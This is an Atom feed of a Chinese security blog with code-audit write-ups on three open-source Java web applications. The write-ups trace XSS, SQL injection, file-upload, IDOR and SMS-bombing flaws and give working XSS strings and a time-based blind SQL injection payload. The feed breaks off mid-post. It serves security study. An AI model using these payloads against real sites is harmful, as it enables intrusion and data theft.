<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://limpid94.github.io</id>
    <title>Limpid</title>
    <updated>2021-08-22T16:55:03.548Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://limpid94.github.io"/>
    <link rel="self" href="https://limpid94.github.io/atom.xml"/>
    <subtitle>Keep thinking , keeping learning</subtitle>
    <logo>https://limpid94.github.io/images/avatar.png</logo>
    <icon>https://limpid94.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Limpid</rights>
    <entry>
        <title type="html"><![CDATA[【Java-Web】某仿商城源码审计]]></title>
        <id>https://limpid94.github.io/post/java-web-mou-fang-shang-cheng-yuan-ma-shen-ji/</id>
        <link href="https://limpid94.github.io/post/java-web-mou-fang-shang-cheng-yuan-ma-shen-ji/">
        </link>
        <updated>2021-08-21T09:32:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="下载地址">下载地址：</h2>
<p>https://gitee.com/project_team/Tmall_demo</p>
<h2 id="安装">安装：</h2>
<p>##审计过程</p>
<h3 id="xss">XSS</h3>
<h4 id="反射型xss">反射型XSS</h4>
<p>程序运行起来后看到搜索框，遂尝试xss<br>
<img src="https://limpid94.github.io/post-images/1629538917561.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1629539009046.PNG" alt="" loading="lazy"><br>
具体代码的查找则根据前端的html代码定位到对应的jsp，然后根据jsp中的EL表达式对全局进行搜索，找到对应的Controller。<br>
首先从数据包中的URI截取<code>product?product_name=</code>作为关键词进行查找<br>
<img src="https://limpid94.github.io/post-images/1629558183309.PNG" alt="" loading="lazy"><br>
发现最后展示的内容来自<code>requestScope.searchValue</code>。由于该框架有使用SpringMVC，所以需要明确<code>searchValue</code>是从哪里来的。<br>
这里顺便提一下 SpringMVC 控制器向视图传值的方式有哪些：</p>
<ul>
<li>ModelAndView</li>
<li>ModelMap</li>
<li>Session</li>
</ul>
<p>经过观察，发现此处使用第二种方式传值<br>
<img src="https://limpid94.github.io/post-images/1629557275826.PNG" alt="" loading="lazy"><br>
所以通过<code>searchValue</code>定位到<code>src/main/java/com/xq/tmall/controller/fore/ForeProductListController.java</code><br>
<img src="https://limpid94.github.io/post-images/1629558440397.PNG" alt="" loading="lazy"><br>
然后往上方查看，发现该值来自<code>product_name</code><br>
<img src="https://limpid94.github.io/post-images/1629558473062.PNG" alt="" loading="lazy"><br>
而<code>product_name</code>则直接来自request请求的参数<br>
<img src="https://limpid94.github.io/post-images/1629558497418.PNG" alt="" loading="lazy"><br>
可以看到输入即输出，并且在整个源码中没看到web.xml（就离谱！）也没有看到XSS过滤器或处理函数，因此造成反射型xss漏洞。</p>
<h4 id="存储型xss">存储型XSS</h4>
<p>同样，在修改个人信息处也存在XSS。现将昵称改为<code>balabala&quot; onmouseover=&quot;alert(1)</code>，保存成功后就能触发。<br>
<img src="https://limpid94.github.io/post-images/1629559533322.PNG" alt="" loading="lazy"></p>
<p>与反射型不同，存储型XSS经过存储数据和取出数据并展示两大步骤，因此需要分两大部分来进行追踪。<br>
<strong>【存储经过】</strong><br>
通过保存信息的数据包的uri<code>/tmall/user/update</code>定位到对应的controller<code>src/main/java/com/xq/tmall/controller/fore/ForeUserController.java</code>，找到<code>user/update</code>的RequestMapping。<br>
该部分的源码如下：</p>
<pre><code class="language-java">    //前台天猫-用户详情更新
    @RequestMapping(value=&quot;user/update&quot;,method=RequestMethod.POST,produces =&quot;application/json;charset=utf-8&quot;)
    public String userUpdate(HttpSession session, Map&lt;String,Object&gt; map,
                             @RequestParam(value = &quot;user_nickname&quot;) String user_nickname  /*用户昵称 */,
                             @RequestParam(value = &quot;user_realname&quot;) String user_realname  /*真实姓名*/,
                             @RequestParam(value = &quot;user_gender&quot;) String user_gender  /*用户性别*/,
                             @RequestParam(value = &quot;user_birthday&quot;) String user_birthday /*用户生日*/,
                             @RequestParam(value = &quot;user_address&quot;) String user_address  /*用户所在地 */,
                             @RequestParam(value = &quot;user_profile_picture_src&quot;, required = false)
                                         String user_profile_picture_src /* 用户头像*/,
                             @RequestParam(value = &quot;user_password&quot;) String user_password/* 用户密码 */
    ) throws ParseException, UnsupportedEncodingException {
        logger.info(&quot;检查用户是否登录&quot;);
        Object userId = checkUser(session);
        if (userId != null) {
            logger.info(&quot;获取用户信息&quot;);
            User user = userService.get(Integer.parseInt(userId.toString()));
            map.put(&quot;user&quot;, user);
        } else {
            return &quot;redirect:/login&quot;;
        }
        logger.info(&quot;创建用户对象&quot;);
        if (user_profile_picture_src != null &amp;&amp; &quot;&quot;.equals(user_profile_picture_src)) {
            user_profile_picture_src = null;
        }
        User userUpdate = new User()
                .setUser_id(Integer.parseInt(userId.toString()))
                .setUser_nickname(user_nickname)
                .setUser_realname(user_realname)
                .setUser_gender(Byte.valueOf(user_gender))
                .setUser_birthday(new SimpleDateFormat(&quot;yyyy-MM-dd&quot;).parse(user_birthday))
                .setUser_address(new Address().setAddress_areaId(user_address))
                .setUser_profile_picture_src(user_profile_picture_src)
                .setUser_password(user_password);
        logger.info(&quot;执行修改&quot;);
        if (userService.update(userUpdate)){
             logger.info(&quot;修改成功!跳转到用户详情页面&quot;);
             return &quot;redirect:/userDetails&quot;;
         }
         throw new RuntimeException();
    }
}
</code></pre>
<p>该部分浏览下来，就是将用户输入的数据从request中取出并赋值到对应的变量，再调用userService的update方法来执行更新语句。<br>
而在<code>UserServiceImpl.java</code>同样没有任何过滤。</p>
<p><strong>【查询并展示经过】</strong><br>
利用前端页面的<code>填写真实的资料，有助于好友找到你哦。</code>来定位jsp页面，找到<code>src/main/webapp/WEB-INF/page/fore/userDetails.jsp</code>。<br>
<img src="https://limpid94.github.io/post-images/1629561337925.PNG" alt="" loading="lazy"><br>
从中得知用户的信息来自<code>requestScope.user</code>。<br>
找到ForeUserController.java的<code>userDetails</code>，从中看到从session中取出userid并带入数据库中进行查找，将结果返回给user变量并set到map中进行传值。<br>
<img src="https://limpid94.github.io/post-images/1629561782494.PNG" alt="" loading="lazy"><br>
该部分也同样没有进行xss的危险函数、字符过滤。因此造成存储型xss漏洞。</p>
<h3 id="任意文件上传">任意文件上传</h3>
<p>在用户头像处可以上传用户自定义的图片，但是上传过程中没有对上传的文件和后缀进行校验，导致用户可以上传恶意的代码（webshell）造成服务器权限沦陷。<br>
<img src="https://limpid94.github.io/post-images/1629562402924.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1629562407489.PNG" alt="" loading="lazy"></p>
<p>从数据包找到接口的代码<br>
<img src="https://limpid94.github.io/post-images/1629562664530.PNG" alt="" loading="lazy"><br>
从上方的红框处得知后端取出上传文件的拓展名后与随机值拼接形成新的文件名，再将新文件名与指定的路径拼接，形成完整的保存路径。<br>
下方的红框则是当文件正确保存在指定路径下则返回success和相对路径。<br>
整个过程没有黑名单过滤或者白名单限制，因此可以成功上传任意文件。</p>
<h3 id="sql注入">SQL注入</h3>
<p>直接全局搜索<code>${</code>，查看是否有开发疏漏的地方。<br>
<img src="https://limpid94.github.io/post-images/1629564762268.PNG" alt="" loading="lazy"><br>
选择第一个进入查看</p>
<pre><code class="language-xml">    &lt;select id=&quot;selectMoreList&quot; resultMap=&quot;productMap&quot;&gt;
        SELECT
            product_id,
            product_name,
            product_title,
            product_price,
            product_sale_price,
            product_create_date,
            product_isEnabled,
            product_category_id,
            product_sale_count,
            product_review_count
        FROM product
        &lt;where&gt;
            &lt;if test=&quot;product != null&quot;&gt;
                &lt;if test=&quot;product.product_price != null&quot;&gt;and product_sale_price &amp;lt;= #{product.product_price}&lt;/if&gt;
                &lt;if test=&quot;product.product_sale_price != null&quot;&gt;and product_sale_price &amp;gt;=
                    #{product.product_sale_price}
                &lt;/if&gt;
                &lt;if test=&quot;product.product_category != null&quot;&gt;
                    &lt;if test=&quot;product.product_category.category_id != null&quot;&gt;and product_category_id =
                        #{product.product_category.category_id}
                    &lt;/if&gt;
                &lt;/if&gt;
            &lt;/if&gt;
            &lt;if test=&quot;product_name_split != null&quot;&gt;
                and
                &lt;foreach collection=&quot;product_name_split&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;and&quot; close=&quot;)&quot;&gt;
                    product_name LIKE concat('%',#{item},'%')
                &lt;/foreach&gt;
            &lt;/if&gt;
            &lt;if test=&quot;product_isEnabled_array != null&quot;&gt;
                and product_isEnabled IN
                &lt;foreach collection=&quot;product_isEnabled_array&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt;
                    #{item}
                &lt;/foreach&gt;
            &lt;/if&gt;
        &lt;/where&gt;
        &lt;if test=&quot;orderUtil != null&quot;&gt;
            ORDER BY ${orderUtil.orderBy}&lt;if test=&quot;orderUtil.isDesc&quot;&gt;desc &lt;/if&gt;
        &lt;/if&gt;
        &lt;if test=&quot;pageUtil != null&quot;&gt;
            LIMIT #{pageUtil.pageStart},#{pageUtil.count}
        &lt;/if&gt;
    &lt;/select&gt;
</code></pre>
<p><code>ORDER BY</code>后面的内容没有采用<code>#{}</code>，而是从<code>orderUtil.orderBy</code>获得排序条件。在OrderUtil.java中查看具体实现方法<br>
<img src="https://limpid94.github.io/post-images/1629564951823.PNG" alt="" loading="lazy"><br>
此时如果有地方调用这两个方法中的一个并且参数可用，则可以造成SQL注入。当然查找的时候有限查找和前台有关的：<br>
<img src="https://limpid94.github.io/post-images/1629565104406.PNG" alt="" loading="lazy"><br>
跟进查看<br>
<img src="https://limpid94.github.io/post-images/1629565177413.PNG" alt="" loading="lazy"><br>
进一步查看<code>orderUtil</code>的来源<br>
<img src="https://limpid94.github.io/post-images/1629565255699.PNG" alt="" loading="lazy"><br>
可以看到<code>orderUtil</code>来自用户可控的<code>orderBy</code>，于是构造url: http://127.0.0.1:8080/tmall/product/6/1?category_id=13&amp;orderBy=product_id，并使用sqlmap进行检测，结果确实是存在时间型盲注。<br>
<img src="https://limpid94.github.io/post-images/1629565481818.PNG" alt="" loading="lazy"></p>
<h3 id="rce方面的查找">RCE方面的查找</h3>
<p>从pom.xml中看到引入的第三方包有：</p>
<pre><code class="language-xml"> &lt;dependencies&gt;
    &lt;!-- Database --&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;mysql&lt;/groupId&gt;
      &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
      &lt;version&gt;5.1.47&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
      &lt;artifactId&gt;druid&lt;/artifactId&gt;
      &lt;version&gt;1.1.19&lt;/version&gt;
    &lt;/dependency&gt;

    &lt;!-- Json --&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
      &lt;version&gt;1.2.58&lt;/version&gt;
    &lt;/dependency&gt;

    &lt;!-- Jsp compatible--&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
      &lt;artifactId&gt;jstl&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
      &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;
      &lt;scope&gt;provided&lt;/scope&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.apache.taglibs&lt;/groupId&gt;
      &lt;artifactId&gt;taglibs-standard-impl&lt;/artifactId&gt;
      &lt;version&gt;1.2.5&lt;/version&gt;
    &lt;/dependency&gt;

    &lt;!-- Mybatis --&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
      &lt;version&gt;3.5.1&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;
      &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;
      &lt;version&gt;2.1.0&lt;/version&gt;
    &lt;/dependency&gt;

    &lt;!-- Spring --&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
      &lt;exclusions&gt;
        &lt;exclusion&gt;
          &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
          &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;
        &lt;/exclusion&gt;
      &lt;/exclusions&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
      &lt;version&gt;2.1.6.RELEASE&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;
      &lt;version&gt;2.1.6.RELEASE&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;
      &lt;version&gt;2.1.6.RELEASE&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;
    &lt;/dependency&gt;

    &lt;!-- log4j2 --&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
      &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
      &lt;version&gt;2.10.0&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
      &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
      &lt;version&gt;2.10.0&lt;/version&gt;
    &lt;/dependency&gt;
  &lt;/dependencies&gt;
</code></pre>
<p>看到使用了fastjson且版本号为1.2.58，确定存在反序列化的Nday，经过测试可以从dnslog看到查询记录，但是因为缺乏可以使用的第三方类导致最终利用失败</p>
<p>接下去，逻辑类漏洞本来想写，但是由于它仿站没完成全部内容，遂放弃。</p>
<h2 id="参考">参考</h2>
<p>[SpringMVC 控制器向视图传值的方式] https://blog.csdn.net/u011403655/article/details/46336751</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[【Java-WEB】租车系统代码审计]]></title>
        <id>https://limpid94.github.io/post/java-web-ssh-kuang-jia-zu-che-xi-tong-dai-ma-shen-ji/</id>
        <link href="https://limpid94.github.io/post/java-web-ssh-kuang-jia-zu-che-xi-tong-dai-ma-shen-ji/">
        </link>
        <updated>2021-08-16T09:36:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="安装过程">安装过程</h2>
<p>安装过程按照源码中的说明来即可<br>
<img src="https://limpid94.github.io/post-images/1629107639331.PNG" alt="" loading="lazy"><br>
需要修改<code>opencar/src/db.properties</code>中的数据库服务的相关配置：<br>
然后在Mysql中添加一个新的数据库命名为<code>opencar</code>即可（主要是为了与<code>db.properties</code>一致）</p>
<p>如果使用Tomcat运行，则需要将源码中的“opencarrun”文件夹整个移入到webapp下，只要数据库配置正确，访问http://127.0.0.1:8080/opencarrun/ 即可运行</p>
<h2 id="审计经过">审计经过</h2>
<h3 id="短信炸弹">短信炸弹</h3>
<p>通过发送短信的数据包发现短信接口<br>
<img src="https://limpid94.github.io/post-images/1629129979543.PNG" alt="" loading="lazy"><br>
通过全局搜索关键字<code>getTelCode</code>，在<code>opencar/src/com/weishang/my/action/FrontAction.java</code>找到发送的方法<br>
<img src="https://limpid94.github.io/post-images/1629130030965.PNG" alt="" loading="lazy"><br>
从中得知大致流程：通过url的参数将tel参数取出来，然后随机生成4位数的验证码并调用<code>smi.sendMessageInfo</code>将短信发送出去，只要返回成功就返回发送成功的json字符串，并将手机号和随机随机验证码在session中绑定。<br>
整个流程没有检查发送次数，因此存在短信轰炸。</p>
<h3 id="xss">XSS</h3>
<p>登录用户后进到用户的基本资料处，随便挑选一处编辑添加payload<br>
<img src="https://limpid94.github.io/post-images/1629131332133.PNG" alt="" loading="lazy"><br>
保存后刷新发现能够触发XSS<br>
<img src="https://limpid94.github.io/post-images/1629131337809.PNG" alt="" loading="lazy"></p>
<p>从前端页面找到对应前端的jsp源码<code>opencar/WebRoot/template/default/page/user/userCenter.jsp</code>，有关的用户信息是从<code>ordinary_user</code>取出：<br>
<img src="https://limpid94.github.io/post-images/1629209830000.PNG" alt="" loading="lazy"><br>
由于没有使用框架，需要花点功夫查找这个对象是从哪里来的。<br>
大致浏览一下网站架构，发现有些地方存在重定向的语句：<br>
<img src="https://limpid94.github.io/post-images/1629210030336.PNG" alt="" loading="lazy"><br>
于是想到个人信息应该是登录后通过一定方式跳转过来的，因此全局搜索<code>userCenter.jsp</code>看看存在在哪些文件中。<br>
<img src="https://limpid94.github.io/post-images/1629210306559.PNG" alt="" loading="lazy"><br>
查看具体的源码，发现这个对象是从session中取出来的。<br>
<img src="https://limpid94.github.io/post-images/1629210377987.PNG" alt="" loading="lazy"><br>
熟悉网站开发的通信学可以想到session中的数据应该是在登录成功的时候被设置的。但是这个不是我们需要继续关心的。现在知道<code>ordinary_user</code>的来源后，要关心更新个人信息的相关流程。<br>
从保存按钮调用的js函数可以看到，其发送到接口<code>&lt;%=basePath%&gt;wx/wxUpdateUserInfo</code><br>
<img src="https://limpid94.github.io/post-images/1629211995409.PNG" alt="" loading="lazy"><br>
全局查找该接口，在<code>opencar/src/com/weishang/my/action/user/WxUpdateUserInfo.java</code>中找到<br>
<img src="https://limpid94.github.io/post-images/1629212051076.PNG" alt="" loading="lazy"><br>
从中看到除了tel参数有做长度的限制之外，其余的均从request实例中直接获取并保存。<br>
<img src="https://limpid94.github.io/post-images/1629212284655.PNG" alt="" loading="lazy"><br>
在web.xml中也没有看到针对XSS的filter，于是造成了存储型的xss漏洞。<br>
其余的地方亦相似，就不一一例举。</p>
<h3 id="越权删除他人账户地址">越权删除他人账户地址</h3>
<p>在收获地址处可以看到用户的个人地址，虽然此处无法越权查看他人的收货地址，但是可以越权删除。<br>
在点击删除按钮后，数据包的接口地址为<code>wx/wxDeleteAddress</code>，因此查找相关地址，并在其中找到处理的流程：<br>
<img src="https://limpid94.github.io/post-images/1629214352415.PNG" alt="" loading="lazy"><br>
在红框处的流程为从request对象中取出<code>address_id</code>后直接带入数据库执行，并没有核对是否属于当前用户。因此可能存在越权删除的漏洞。<br>
为了进一步验证漏洞，我设置两个账号test1和test2，其地址分别如下<br>
<img src="https://limpid94.github.io/post-images/1629214465512.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1629214471950.PNG" alt="" loading="lazy"><br>
在数据库中对应的id为：<br>
<img src="https://limpid94.github.io/post-images/1629214482333.PNG" alt="" loading="lazy"><br>
现在用test1的账户（对应地址为701）对test2的id为702的地址进行删除<br>
<img src="https://limpid94.github.io/post-images/1629214566538.PNG" alt="" loading="lazy"><br>
返回删除成功，此时test2的账户中已经找不到收货地址<br>
<img src="https://limpid94.github.io/post-images/1629214629859.PNG" alt="" loading="lazy"><br>
当然还有越权查看他人订单，这里就不详细说明了。</p>
<h3 id="sql注入">SQL注入</h3>
<p>本源码中与数据库进行交互的地方大量使用了预编译技术，但是由于开发的原因还是不少地方存在变量拼接之处。同时在京东的一篇技术文章也指出在<code>like</code>、<code>in</code>、 <code>order by</code>部分使用预编译技术会产生报错<br>
<img src="https://limpid94.github.io/post-images/1629265710412.PNG" alt="" loading="lazy"></p>
<p>从本源码的service部分进行查找，发现了不少的变量拼接。这里以<code>getGoodsPojoListByTypeAndcatAndBranAndPrice</code>为例。<br>
从ShopService.java中看到getGoodsPojoListByTypeAndcatAndBranAndPrice的实现过程<br>
<img src="https://limpid94.github.io/post-images/1629265901055.PNG" alt="" loading="lazy"><br>
这里<code>cat_ids</code>、<code>type_ids</code>、<code>brand_ids</code>、<code>price</code>、<code>order</code>均为string类型，存在输入恶意SQL语句的可能性（查找的过程中直接排除Interger类型，因为JAVA为强类型语言。）<br>
此处在<code>in</code>后存在变量拼接。紧接着查找调用该方法的地方。<br>
<img src="https://limpid94.github.io/post-images/1629266094971.PNG" alt="" loading="lazy"><br>
双击后来到GoodList.java，在里面找到具体的调用过程：<br>
<img src="https://limpid94.github.io/post-images/1629266163981.PNG" alt="" loading="lazy"><br>
这里的参数没有经过过滤，直接从requests对象中取出并带入到SQL语句中查询。这样做确实存在SQL注入漏洞。现在需要查找流程从哪里进入到此处。<br>
在第23行有<code>@WebServlet(displayName=&quot;跳转到信访页面&quot;,name=&quot;GoodsList&quot;,urlPatterns=&quot;/goods&quot;)</code>说明访问的地址是<code>baseurl+/goods</code>，但是查找的时候并没有找到。后来经过长时间的查找，发现跳转的细节是<code>response.sendRedirect(basePath+&quot;goods?cat_id=&quot;+type_id+&quot;&amp;menuId=7&quot;);</code>，于是跟进到FrontAction.java，<br>
<img src="https://limpid94.github.io/post-images/1629266485172.PNG" alt="" loading="lazy"><br>
于是构造<code>cat_id</code>的值为<code>1) and if(ascii(substr(user(),1,1))&gt;50,sleep(2),1) -- -</code>，当正确时经过一段时间的延迟后返回<br>
<img src="https://limpid94.github.io/post-images/1629267571003.PNG" alt="" loading="lazy"><br>
当错误时直接返回<br>
<img src="https://limpid94.github.io/post-images/1629267608278.PNG" alt="" loading="lazy"><br>
后续就不再继续。<br>
其他的注入点类似，遂不一一分析。</p>
<h3 id="备注">备注</h3>
<p>本源码还有一处漏洞在于支付流程可以0元购，但是搭建起来后在支付环节一直报错，弄了很久也没办法修复，遂放弃调试。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[【Java-WEB】酷因教育网站代码审计]]></title>
        <id>https://limpid94.github.io/post/java-web-ku-yin-jiao-yu-wang-zhan-dai-ma-shen-ji/</id>
        <link href="https://limpid94.github.io/post/java-web-ku-yin-jiao-yu-wang-zhan-dai-ma-shen-ji/">
        </link>
        <updated>2021-08-11T17:27:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="源码搭建">源码搭建</h2>
<p>使用IDEA打开源码，首先修改pom.xml的几处地方<br>
<img src="https://limpid94.github.io/post-images/1629042015880.PNG" alt="" loading="lazy"><br>
接着修改project.properties的配置<br>
<img src="https://limpid94.github.io/post-images/1629042035467.PNG" alt="" loading="lazy"><br>
随后配置运行环境<br>
<img src="https://limpid94.github.io/post-images/1629042048903.PNG" alt="" loading="lazy"><br>
最后导入sql文件到mysql中即可。</p>
<h2 id="审计经过">审计经过</h2>
<h3 id="反射型xss漏洞">反射型XSS漏洞</h3>
<h4 id="黑盒测试情况">黑盒测试情况：</h4>
<p>直接在搜索框输入<code>&quot;&gt;&lt;img+src=&quot;x&quot;+onerror=&quot;alert(/xxx/)</code>，则在相应包中原样输出，未经过滤，直接触发XSS弹窗。<br>
<img src="https://limpid94.github.io/post-images/1629001212130.PNG" alt="" loading="lazy"></p>
<h4 id="白盒审计情况">白盒审计情况</h4>
<p>先看web.xml的filter配置情况。<br>
<img src="https://limpid94.github.io/post-images/1629001508283.PNG" alt="" loading="lazy"><br>
从中未发现有XSS的相关过滤项。于是从相应包的XSS的位置找到对应的前端<code>header.jsp</code>，发现搜索框的具体内容是用EL表达式进行取值。<br>
<img src="https://limpid94.github.io/post-images/1629001897658.PNG" alt="" loading="lazy"><br>
于是从entity中找到具体的内容<br>
<img src="https://limpid94.github.io/post-images/1629001888577.PNG" alt="" loading="lazy"><br>
而该值是从数据库中查询的：<br>
<img src="https://limpid94.github.io/post-images/1629002287672.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1629002312744.PNG" alt="" loading="lazy"><br>
到目前的反向追溯都没有发现有转义或者过滤。再到controller层进行查看<br>
<img src="https://limpid94.github.io/post-images/1629002483122.PNG" alt="" loading="lazy"><br>
浏览下来也没有对XSS进行处理，因此最后会将危险的XSSpayload原样输出。</p>
<h3 id="sql注入前台和后台">SQL注入（前台和后台）</h3>
<p>首先全局搜索<code>${</code>，因为使用<code>${}</code>进行数据库查询是不经过预编译的，因此可能存在SQL注入<br>
<img src="https://limpid94.github.io/post-images/1628921420323.PNG" alt="" loading="lazy"><br>
数量还是比较多，任选一处入手好了。<br>
<img src="https://limpid94.github.io/post-images/1628921575493.PNG" alt="" loading="lazy"><br>
看到此处的对应的方法为<code>delMsgSystemById</code>，查看dao中相应的接口：<br>
<img src="https://limpid94.github.io/post-images/1628923025919.PNG" alt="" loading="lazy"><br>
再看service相关的代码是如何实现的。具体的代码在<code>MsgSystemServiceImpl.java</code>中<br>
<img src="https://limpid94.github.io/post-images/1628923498595.PNG" alt="" loading="lazy"><br>
通过其对应到的<code>AdminMsgSystemController.java</code>的源码可以看到对应的接口名称和传入参数<br>
<img src="https://limpid94.github.io/post-images/1628923677426.PNG" alt="" loading="lazy"><br>
通过对逻辑代码的审查，看到如果查询成功就显示json字符串的</p>
<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;操作成功！&quot;,&quot;entity&quot;:null}
</code></pre>
<p>否则显示</p>
<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;系统繁忙,请稍后再试！&quot;,&quot;entity&quot;:null}
</code></pre>
<p>由此推断该注入类型为盲注。<br>
但由于是在后台，所以需要先用管理员账号登录后再尝试访问接口。<br>
<img src="https://limpid94.github.io/post-images/1628923908100.PNG" alt="" loading="lazy"><br>
通过后台的debug日志，发现确实带入了我们的“恶意”语句<br>
<img src="https://limpid94.github.io/post-images/1628923993785.PNG" alt="" loading="lazy"><br>
此处以查询当前user()的首位字符为例，当ascii码大于113的时候执行了sleep(3)，大于114时直接返回。<br>
<img src="https://limpid94.github.io/post-images/1628924643788.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1628924652053.PNG" alt="" loading="lazy"><br>
由此现象可以说明当前user()的首位字符的ascii码为114，转成字符为<code>r</code><br>
当然，此处要利用还是比较鸡肋的，继续看看是否存在前端的SQL注入。<br>
继续查找，发现<code>CourseFavoritesMapper.xml</code>中存在SQL注入的“标志”<br>
<img src="https://limpid94.github.io/post-images/1628925616258.PNG" alt="" loading="lazy"><br>
通过id去dao中查找对应的接口情况：<br>
<img src="https://limpid94.github.io/post-images/1628925723642.PNG" alt="" loading="lazy"><br>
又找到对应的serviceImpl<br>
<img src="https://limpid94.github.io/post-images/1628925779369.PNG" alt="" loading="lazy"><br>
最后定位到Controller<br>
<img src="https://limpid94.github.io/post-images/1628925802781.PNG" alt="" loading="lazy"><br>
看到对应的url是<code>/deleteFaveorite/{ids}</code>，当然直接这样访问是不对的，因为在这个controller一开始的地方多了个<code>RequestMapping</code>注解<br>
<img src="https://limpid94.github.io/post-images/1628925796096.PNG" alt="" loading="lazy"><br>
因此正确的接口是<code>/uc/deleteFaveorite/{ids}</code><br>
尝试访问<code>/uc/deleteFaveorite/29'</code>发现报错<br>
<img src="https://limpid94.github.io/post-images/1628928733737.PNG" alt="" loading="lazy"><br>
从后台的日志可以看到报错，并且查询语句确实传入我们的单引号。<br>
<img src="https://limpid94.github.io/post-images/1628928752438.PNG" alt="" loading="lazy"><br>
使用sqlmap进行测试，结果存在注入。<br>
<img src="https://limpid94.github.io/post-images/1628929004341.PNG" alt="" loading="lazy"><br>
其余的注入点不再一一测试。</p>
<h3 id="越权">越权</h3>
<p>为了测试，注册两个普通用户123@qq.com和111@q.com。id分别为68和69。<br>
现在登录id为69的账户，修改名称为张三后提交并拦截数据包：<br>
<img src="https://limpid94.github.io/post-images/1628931594712.PNG" alt="" loading="lazy"></p>
<p><img src="https://limpid94.github.io/post-images/1628931671504.PNG" alt="" loading="lazy"><br>
发送后登录id为68的账号查看情况<br>
<img src="https://limpid94.github.io/post-images/1628931748620.PNG" alt="" loading="lazy"><br>
为了究其原因，需要从代码层面入手。<br>
首先到controller中找到对应的逻辑代码。<br>
<img src="https://limpid94.github.io/post-images/1628931856524.PNG" alt="" loading="lazy"><br>
可以看到直接把传入的POST参数实例化成User类的实例并对应赋值后带入数据库执行。再UserServiceImpl.java中第95行看到直接执行dao的updateUser方法。<br>
<img src="https://limpid94.github.io/post-images/1628931991994.PNG" alt="" loading="lazy"><br>
在对应的mapper中找到更新语句：<br>
<img src="https://limpid94.github.io/post-images/1628932076937.PNG" alt="" loading="lazy"><br>
由此可见整个流程并没有对用户身份进行校验，导致用户可以修改任意账号的信息。<br>
进一步思考：能否改到admin账号呢？<br>
从UserMapper.xml中看到，update的语句是执行的表明是EDU_USER，而admin是在SYS_USER中，因此不可以修改admin账号的任何信息。</p>
<h3 id="任意文件上传">任意文件上传</h3>
<p>在前台用户的头像上传功能上传头像时可以指定上传类型并上传恶意代码，从而获取服务器权限。<br>
在测试上传文件时发现fileType参数是允许的类型，如果filename的后缀在fileType所指定的范围内，则可以上传成功（但是经过测试，jsp后缀不可以）<br>
<img src="https://limpid94.github.io/post-images/1628956875828.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1628956902279.PNG" alt="" loading="lazy"></p>
<p>原想向从上传的数据包来定位controller，发现没有相关的路径，但是找到在<code>src/main/java/com/inxedu/os/common/controller/VideoUploadController.java</code>中有<code>gok4</code>方法，仔细观察和我们上传图片的数据包中的参数均相同<br>
<img src="https://limpid94.github.io/post-images/1628961316862.PNG" alt="" loading="lazy"><br>
